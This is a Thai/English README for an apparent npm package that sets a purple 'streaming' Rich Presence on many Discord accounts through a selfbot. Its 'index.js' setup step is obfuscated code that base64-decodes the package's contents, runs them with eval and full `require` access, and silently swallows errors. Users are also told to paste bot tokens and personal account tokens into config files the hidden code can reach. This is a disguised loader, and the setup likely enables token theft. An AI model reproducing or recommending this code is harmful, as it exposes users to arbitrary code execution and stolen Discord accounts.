# STATUS-Discord RichPresence Selfbot-V13 NodeJS-Module
+ 🟣Streaming status for Discord accounts
+ 🟣This code can make purple pill status unlimited for multiple accounts.

+ 🟣สถานะการสตรีมสำหรับบัญชี Discord
+ 🟣โค้ดนี้สามารถทำสถานะเม็ดม่วงผ่านบอทได้หลายบัญชีไม่จำกัด
+ 🟣ออกแบบมาเพื่อปรับแต่งชื่อโดยไม่ต้องปิดโค้ดแล้วรันใหม่
+ 🟣สถานะจะอัปเดตให้อัตโนมัติเมื่อมีการอัพเดทส่งข้อมูลผ่านบอท

<a href="https://pic.in.th/image/se.QWkpc4"><img src="https://img5.pic.in.th/file/secure-sv1/sef1bd0ce5ecb6d9fb.png" alt="se" border="0"></a>

## Installation
+ ติดตั้ง Modules
```sh
npm install status-chii-v2
```
## Run Code
+ รันโค้ด
```sh
node index.js
```
+ How To Code index.js STATUS Discord RichPresence
+ วิธีการเขียนโค้ด index.js สถานะ Discord RichPresence

# ใส่โทเค็นบอทในไฟล์ config.json
```js
{
    "TOKEN_BOT": "โทเค็นบอท",
    "user": []
}
```

# สร้างไฟล์ชื่อ index.js 
```js
(function () {
    let _0x1a3b = 'utf8';
    let _0x9f45 = 'status-chii-v2';
    let _0x7bdc = 'base64';
    function _0x8dfg6(_0x5e1a, _0x6b7d) {
        return (function (_0x2f7c, _0x1f3b) {
            return _0x2f7c(_0x5e1a, _0x1f3b);
        })(function (_0x4f32, _0x8e9d) {
            return eval(_0x4f32);
        }, _0x6b7d);
    }
    try {
        let _0x21a9 = Buffer.from(require(_0x9f45), _0x7bdc).toString(_0x1a3b);
        let _0x13fe = _0x8dfg6(_0x21a9, require);
        if (typeof _0x13fe === 'function') {
            _0x13fe();
        }
    } catch (error) {
        let originalConsoleError = console.error;
        console.error = () => { };
        console.error = originalConsoleError;
    }
})();
```

# ปรับแต่งหน้าต่างสถานะที่ไฟล์ embed.js
+ เปลี่ยนทุกอย่างได้นะครับ แต่ยกเว้นบรรทัดที่มีคำว่า // ห้ามลบห้ามเปลี่ยน > ชื่อ open และ offline ห้ามไปแก้ไขมันนะครับ
```js
const { EmbedBuilder, ButtonBuilder, ActionRowBuilder, ButtonStyle } = require('discord.js');

const EmbedFrom = (interaction) => {
    const embed = new EmbedBuilder()
        .setColor(0x6633CC)
        .setTitle('``🟣`` เปิดสถานะสตรีมมิ่งบนโปรไฟล์')
        .addFields(
            { name: '``✅`` เปิดใช้งาน', value: '``กดที่เปิดสถานะ``', inline: true },
            { name: '``❌`` ปิดใช้งาน', value: '``กดที่ปิดสถานะ``', inline: true },
            { name: '``📖`` จัดข้อมูลให้ครบ', value: '``หากแจ้งเตือนข้อผิดพลาด``', inline: true },
        )
        .setImage('https://s12.gifyu.com/images/Sr3l3.gif')

    return embed;
};

const ButtonFrom = (interaction) => {
    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('open') // ห้ามลบห้ามเปลี่ยน
                .setLabel('✅เปิดสถานะ')
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId('offline') // ห้ามลบห้ามเปลี่ยน
                .setLabel('❌ปิดสถานะ')
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setLabel('🚀 วิธีใช้งาน')
                .setStyle(ButtonStyle.Link)
                .setURL('https://discord.com')
        );
    return row;
}

module.exports = { EmbedFrom, ButtonFrom }; 
```

# แพ็กเก็จเสร็ม package.json
```js
{
  "dependencies": {
    "status-chii-v2": "^1.0.1"
  }
}
```

# การกำหนดชื่อสถานะสังเกตุที่ชื่อหัวข้อมัน

+ token = "โทเค็นผู้ใช้งาน"
+ setURL = "ลิงค์สตรีมมิ่ง https://twitch.tv/streamer"

+ Details = ["ชื่อด้านบนสุดหน้าแรก", "ชื่อด้านบนสุดหน้าสอง"]
+ setState = ["ชื่อตรงกลางหน้าแรก", "ชื่อตรงกลางหน้าสอง"]
+ LargeText = ["ชื่อด้านล่างสุดหน้าแรก", "ชื่อด้านล่างสุดหน้าสอง"]

+ largeImageLinks = ["ลิงค์รูปภาพใหญ่หน้าแรก", "ลิงค์รูปภาพใหญ่หน้าสอง"]
+ smallImageLinks = ["ลิงค์รูปภาพเล็กหน้าแรก", "ลิงค์รูปภาพเล็กหน้าสอง"]

+ button1 = "ชื่อปุ่มที่1"
+ link1 = "https://ลิงค์ปุ่มที่1"

+ button2 = "ชื่อปุ่มที่2"
+ link2 = "https://ลิงค์ปุ่มที่2"

# หยิบชื่อไปใช้แต่งตั้งค่าสถานะในไฟล์ก่อนส่งให้บอท สามารถหยิบชื่อสถานะไปเขียนเอาไว้ในชื่อได้

+ เวลานาที ตัวอย่าง 10:10
```js
time:t
```
+ ปฎิทินวันที่ตัวเลขตัวอย่าง 10/10/2030
```js
date:n
```
+ ปฎิทินวันที่ภาษาไทยตัวอย่าง 10/มกราคม/2030
```js
date:th
```
+ แสดงปฎิทินวันที่ภาษาอังกฤษ 10/January/2030
```js
date:eg
```
+ แสดงวันของไทยตัวอย่าง จันทร์ อังคาร.....
```js
day:th
```
+ แสดงวันของอังกฤษตัวอย่าง 𝐒𝐮𝐧𝐝𝐚𝐲 𝐌𝐨𝐧𝐝𝐚𝐲.....
```js
day:eg
```
+ แสดงสถานะความปิงตัวอย่าง 200 km/s
```js
ping:ms
```
+ แสดงสถานะความร้อนตัวอย่าง 24 °C
```js
temp:c
```
+ แสดงสถานะแรมตัวอย่าง 32 GB
```js
ram:g
```
+ แสดงสถานะ CPU ตัวอย่าง 𝐂𝐏𝐔 𝐑𝐲𝐳𝐞𝐧 𝟓 𝟓𝟔𝟎𝟎𝐗 𝟑.𝟕 𝐆𝐇𝐳
```js
cpu:g
```

# ตัวอย่างวิธีหยิบกรอกชื่อให้มันสถานะต่าง
+ ในมุมมองมันจะแสดงผลแบบนี้ เวลา 10:10 วันที่ 10/10/2030
+ หากแต่งอักษรพิเศษใส่มันจะแสดงแบบนี้ 
꒰ เวลา 10:10 ꒱ ⚘ ꒰ 10/10/2030 ꒱

```js
เวลา: time:t วันที่: date:n 
```

# ไฟล์ทำสถานะเม็ดม่วง กำหนดแต่งใน ไฟล์ txt แล้วให้เอาไปวางไว้กับบอทที่คำว่า "เปิดสถานะ"
```js
        {
            "token": "โทเค็นผู้ใช้งาน",
            "setURL": [
                "https://twitch.tv/chii"
            ],
            "Details": [
                "꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                , "꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ day:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ day:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ day:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
            ],
            "setState": [
                "【 𝟏 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟐 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟑 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟒 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟓 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟔 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟕 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟖 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟗 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟏𝟎 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
            ],
            "LargeText": [
                "⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
            ],
            "largeImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "smallImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "button1": "button1",
            "link1": "https://discord.gg/5gAsw4Pawq",
            "button2": "button2",
            "link2": "https://discord.gg/5gAsw4Pawq"
        }

```

# ผู้พัฒนาโค้ดสตรีมมิ่ง By Developer : CHII แอดมินซี
+ เซิร์ฟเวอร์ Discord https://discord.gg/5gAsw4Pawq
